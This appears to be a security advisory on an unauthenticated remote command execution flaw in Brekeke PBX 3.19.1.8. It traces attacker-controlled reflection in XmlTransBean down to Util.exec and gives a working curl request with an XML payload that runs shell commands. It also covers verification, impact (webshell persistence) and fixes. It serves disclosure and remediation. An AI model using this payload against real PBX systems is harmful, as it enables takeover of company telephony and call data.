# Brekeke PBX — Unauthenticated XmlTransBean Util.exec RCE

## 1. Research Target & Attack Surface

Brekeke PBX 3.19.1.8 is an enterprise SIP/PBX product — the kind of appliance that sits at the edge of a company's telephony and is often reachable from the internet. It runs as a Tomcat 9.0.87 web application at context path `/pbx`, sharing the Tomcat with the sibling `/sip` webapp. We focused on `/pbx` because its `GateServlet` dispatches to dynamically-instantiated bean classes — a design that historically invites reflection-based abuse.

Relevant surface:

| Item | Value |
|---|---|
| Entry point | `POST /pbx/gate?bean=web.XmlTransBean` |
| Dispatch model | `GateServlet` instantiates `com.brekeke.<bean>` from `bean=` and calls `execute()` |
| Reachable beans | 200+ classes under `com.brekeke.*` |
| Container auth | **None** — no security-constraint, no filter, no authenticator Valve for `/pbx` |
| App-level auth | `Bean.checkAuth()` + `SipAdminBase.execMain()` `pbxPageAccess()` gate |

## 2. Sink Identification: Util.exec

We decompiled `/pbx/WEB-INF/lib/ondoutil.jar` and searched for command-execution sinks. Exactly one stood out:

```java
// Util.java:537-538
public static String exec(String[] stringArray) throws IOException {
    Process process = Runtime.getRuntime().exec(stringArray);  // direct exec
    InputStream inputStream = process.getInputStream();
    try { ... read stdout ... return string; }
    finally { inputStream.close(); process.waitFor(); }
}
```

It is `static` (callable via reflection without an instance), takes a `String[]` (so no argument-count ambiguity), and is the only `exec` overload in the class.

## 3. Source Identification: XmlTransBean Reflection

`XmlTransBean.execute()` is the reflection bridge: it parses an XML body from the request, takes a class name from the `cls` attribute, a method name from `act`, builds arguments from child elements, and invokes:

```java
String string2 = object.getAttribute("cls");   // class name — attacker-controlled
Class<?> clazz = Class.forName(string2);       // load arbitrary class
...
String string = object.getAttribute("act");    // method name — attacker-controlled
...
Object object2 = methodArray[i].invoke(xmlTransServer, objectArray);  // invoke (null=static)
```

For a non-`XmlTransServer` class, `xmlTransServer` stays `null`, so `invoke(null, args)` calls any **public static** method — including `Util.exec`. The `ArraySerializer` builds the `String[]` from `<ary><p1>...</p1>...</ary>` child elements, so the full payload is expressible entirely in XML.

## 4. End-to-End Data Flow

```
HTTP POST /pbx/gate?bean=web.XmlTransBean
  body: <transobj cls="com.brekeke.util.Util" act="exec">
          <ary><p1>sh</p1><p1>-c</p1><p1>id > /tmp/proof</p1></ary>
        </transobj>
    → GateServlet → Bean.go → createBean("com.brekeke.web.XmlTransBean")
    → bean.init() → bean.checkAuth() (POST → pass) → bean.execute()
    → XmlTransBean.execute() (never calls execMain → pbxPageAccess not reached)
    → Class.forName("com.brekeke.util.Util")
    → method = Util.exec (name "exec", 1 String[] param, 1 child element → match)
    → ArraySerializer → String[]{"sh","-c","id > /tmp/proof"}
    → method.invoke(null, args) → Util.exec → Runtime.exec
    → sh -c "id > /tmp/proof" as tomcat (uid 53)
```

## 5. Exploit Construction

The payload is a single unauthenticated POST — no cookies, no Authorization header:

```bash
curl -s -X POST "http://<TARGET_IP>:8090/pbx/gate?bean=web.XmlTransBean" \
  -H "Content-Type: text/xml" \
  --data-binary '<transobj cls="com.brekeke.util.Util" act="exec"><ary><p1>sh</p1><p1>-c</p1><p1>id > /tmp/pbx_proof</p1></ary></transobj>'
```

HTTP response (200, fresh server-created session, no client credentials):

```http
HTTP/1.1 200
Set-Cookie: JSESSIONID=...; Path=/pbx
Transfer-Encoding: chunked

<?xml version="1.0" encoding="utf-8" standalone="no"?><transobj/>
```

The response body is a generic `<transobj/>` — `Util.exec` returns the command stdout, but the handler discards it, so verification relies on the side effect (marker file).

## 6. Dynamic Verification

Verified on Brekeke PBX 3.19.1.8 (Tomcat 9.0.87, Java 17) with a freshly restarted service:

1. Send the single unauthenticated POST above.
2. Marker `/tmp/pbx_proof` created: `uid=53(tomcat) gid=53(tomcat) groups=53(tomcat)`.
3. Three independent commands (`id`, `echo INDEPENDENT_CONFIRMED`, `uname -r`) all executed — proving real command execution, not a canned response.

The PoC script wraps the request and marker verification (pure Python standard library).

## 7. Reachability & Impact

- **Network**: any host that can reach the PBX web port
- **Auth**: none — `checkAuth` fail-open, no container constraints
- **Default config**: reachable in normal post-install service state
- **No MITM / no JNDI server**: direct `Util.exec`; no LDAP/gadget dependency
- **Privilege**: `tomcat` (uid 53) — enough to write a webshell into the webroot for persistence

The impact is unauthenticated remote command execution as the Tomcat user on the PBX host — full compromise of PBX configuration, call routing, and call data, with a clear persistence path via webroot write access. For an internet-exposed PBX, this is a direct takeover.

## 8. Fix Recommendations

1. Require authentication for `XmlTransBean` (route it through the `pbxPageAccess` gate / extend `SipAdminBase`)
2. Make `Bean.checkAuth()` deny-by-default instead of fail-open
3. Whitelist classes permitted by `Class.forName` (XmlTransServer subclasses only)
4. Make `Util.exec` package-private (or verify the caller stack)
